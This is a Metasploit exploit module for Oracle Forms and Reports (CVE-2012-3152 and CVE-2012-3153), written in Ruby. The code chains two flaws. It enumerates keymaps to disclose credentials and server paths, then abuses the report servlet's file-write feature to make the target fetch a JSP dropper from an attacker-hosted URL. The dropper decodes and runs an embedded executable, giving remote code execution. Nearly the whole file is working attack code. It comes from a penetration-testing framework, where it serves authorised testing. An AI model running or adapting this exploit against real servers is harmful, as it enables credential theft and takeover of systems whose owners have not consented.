##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'uri'
require 'open-uri'

class Metasploit3 < Msf::Exploit::Remote

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Remote::HttpServer::HTML
  include Msf::Exploit::EXE

  Rank = GreatRanking

  def initialize(info = {})
    super(update_info(info,
      'Name'            => 'Oracle Forms and Reports',
      'Description'     => %q{
      This module uses two vulnerabilities in Oracle forms and reports to get remote code execution on the host. The showmap url combined with parsequery
      can be used to disclose credentials and information about a server. A second vulnerability that allows arbitrary reading and writing
      to the host filesystem can then be used to write a shell from a remote url to a known local path disclosed from the previous vulnerability.
      The local path being accessable from an URL then allows us to perform the remote code execution using for example a .jsp shell.
      Tested on Linux and Oracle Forms and Reports 11.1.
      },
      'Author'          =>
        [
          'miss_sudo <security[at]netinfiltration.com>', # Vulnerability discovery
          'Mekanismen <mattias[at]gotroot.eu>' # Metasploit module
        ],
      'License'         => MSF_LICENSE,
      'References'      =>
        [
          [ "CVE", "2012-3152" ],
          [ "CVE", "2012-3153" ],
          [ "EDB", "31253" ],
          [ 'URL', "http://netinfiltration.com" ]
        ],
      'Stance'          => Msf::Exploit::Stance::Aggressive,
      'Platform'        => ['win', 'linux'],
      'Targets'         =>
        [
          [ 'Linux',
            {
            'Arch' => ARCH_X86,
            'Platform' => 'linux'
            }
          ],
          [ 'Windows',
            {
            'Arch' => ARCH_X86,
            'Platform' => 'win'
            }
          ],
        ],
      'DefaultTarget'   => 0,
      'DisclosureDate'  => 'Jan 15 2014'
    ))
    register_options(
      [
        OptString.new('EXTURL', [false, 'An alternative host to request the payload from', "" ]),
        OptString.new('PAYDIR', [false, 'The folder to download the payload to', "/examples/" ]),
        OptInt.new('HTTPDELAY', [false, 'Time that the HTTP Server will wait for the payload request', 10]),
      ])
  end

  def check
    url = datastore['RHOST']
    url = "http://" + url + "/reports/rwservlet/showmap"
    uri = URI.parse(url)
    begin
    html = uri.open.read
    rescue
      return Exploit::CheckCode::Safe
    end
    if html =~ /Reports Servlet Key Map/
      return Exploit::CheckCode::Appears
    else
      return Exploit::CheckCode::Safe
    end
  end

  def exploit
    @hacked = false
    @payload_url = ""
    @payload_name = rand_text_alpha(8+rand(8)) + ".jsp"
    @payload_dir = datastore['PAYDIR']
    @local_path = ""

    @url = datastore['RHOST']
    url = "http://" + @url + "/reports/rwservlet/showmap"
    uri = URI.parse(url)
    begin
    html = uri.open.read
    rescue
      fail_with(Failure::Unknown, "#{peer} - target is not vulnerable or unreachable")
    end

    if html.include?("Reports Servlet Key Map")
      test = html.scan(/<SPAN class=OraInstructionText>(.*)<\/SPAN><\/TD>/).flatten

      #Parse keymaps for servers
      print_status "#{peer} - Enumerating keymaps ... "
      uri = target_uri.path
      test.each do |t|
        if not @hacked
          t = t.delete(' ')
          res = send_request_cgi({
            'uri' => normalize_uri(uri, "/reports/rwservlet/parsequery?#{t}"),
            'method' => 'GET',
          })
          if res and res.code == 200
            if res.body =~ /userid=(.*)@/
              authid = $1
            end
            if res.body =~ /server=(\S*)/
              server = $1
            end
          end
          if server and authid
            getenv(server, authid)
          end
        end
      end
    else
      fail_with(Failure::Unknown, "#{peer} - target is not vulnerable or unreachable")
    end
    unless @hacked
      print_status "#{peer} - Enumeration done ... no vulnerable keymaps for automatic exploitation found"
    end
  end

  def primer
    @payload_url = get_uri
    @pl = gen_file_dropper
    upload_payload
  end

  def on_request_uri(cli, request)
    send_response(cli, @pl)
  end

  def setup_payload
    if datastore['EXTURL'].blank?
      begin
        Timeout.timeout(datastore['HTTPDELAY']) {super}
      rescue Timeout::Error
      end
      exec_payload
    else
      @payload_url = datastore['EXTURL']
      upload_payload
      exec_payload
    end
  end

  def getenv(server, authid)
    print_good "#{peer} - Found server: #{server}"
    print_good "#{peer} - Found credentials: #{authid}"
    print_status "#{peer} - Querying showenv ..."

    url = "http://" + @url + "/reports/rwservlet/showenv?server=#{server}&authid=#{authid}"
    uri = URI.parse(url)
    begin
    html = uri.open.read
    rescue
      print_status("#{peer} - Query failed")
    else
      if html =~ /\\(.*)\\showenv/
        print_good "#{peer} - Query succeeded!"
        print_status "#{peer} - Windows install detected "
        print_status "#{peer} - Uploading payload ..."
        @local_path = $1.gsub("\\", "/")
        setup_payload
      elsif html =~ /\/(.*)\/showenv/
        print_good "#{peer} - Query succeeded!"
        print_status "#{peer} - Linux install detected"
        print_status "#{peer} - Uploading payload ..."
        @local_path = $1
        setup_payload
      else
        print_status "#{peer} - Query failed"
      end
    end
  end

  def upload_payload
    path = "/#{@local_path}#{@payload_dir}#{@payload_name}"

    uri = target_uri.path
    res = send_request_cgi({
      'uri' => normalize_uri(uri, "/reports/rwservlet"),
      'method' => 'GET',
      'encode_params' => false,
      'vars_get' => {
        'report' => 'test.rdf',
        'desformat' => 'html',
        'destype' => 'file',
        'desname' => path,
        'JOBTYPE' => 'rwurl',
        'URLPARAMETER' => @payload_url
      }
    })

    if res and res.body.include?("Successfully run")
      @hacked = true
      print_good "#{peer} - Payload uploaded!"
    else
      print_status "#{peer} - Payload upload failed"
    end
  end

  def gen_file_dropper
    gen_payload_name   = rand_text_alpha(8+rand(8))
    encoded_pl  = Rex::Text.encode_base64(generate_payload_exe)
    print_status "#{peer} - Building JSP shell ..."

    #embed our payload
    shell  = "<%@ page import=\"java.util.*,java.io.*, sun.misc.BASE64Decoder\"%>"
    shell += " <%"
    shell += " BASE64Decoder decoder = new BASE64Decoder();"
    shell += " byte [] pl = decoder.decodeBuffer(\"#{encoded_pl}\");"
    #correct file suffix if windows
    if datastore['TARGET'] == 1
      shell += " File temp = File.createTempFile(\"#{gen_payload_name}\", \".exe\");"
    else
      shell += " File temp = File.createTempFile(\"#{gen_payload_name}\", \".tmp\");"
    end
    shell += " String path = temp.getAbsolutePath();"
    shell += " BufferedOutputStream ou = new BufferedOutputStream(new FileOutputStream(path));"
    shell += " ou.write(pl);"
    shell += " ou.close();"
    #correct rights if linux host
    if datastore['TARGET'] == 0
      shell += " Process p = Runtime.getRuntime().exec(\"/bin/chmod 700 \" + path);"
      shell += " p.waitFor();"
    end
    shell += " Runtime.getRuntime().exec(path);"
    shell += "%>"

    return shell
  end

  def exec_payload
    print_status("#{peer} - Our payload is at: #{peer}/reports#{@payload_dir}#{@payload_name}")
    print_status("#{peer} - Executing payload...")

    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, "reports", @payload_dir, @payload_name),
      'method' => 'GET'
    })
  end
end
